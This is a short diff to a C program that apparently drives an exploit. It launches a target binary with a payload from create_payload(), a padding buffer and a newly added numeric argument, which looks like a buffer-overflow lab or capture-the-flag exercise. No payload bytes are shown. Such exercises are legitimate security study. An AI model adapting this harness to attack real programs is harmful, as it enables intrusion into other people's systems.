@@ -31,7 +31,8 @@ int main(void) {
 
     args[0] = TARGET;
     args[1] = create_payload();
-    args[2] = NULL;
+    args[2] = "65935";
+    args[3] = NULL;
 
     char padding[PADDING_LENGTH + 1];
     memset(padding, '0', PADDING_LENGTH);
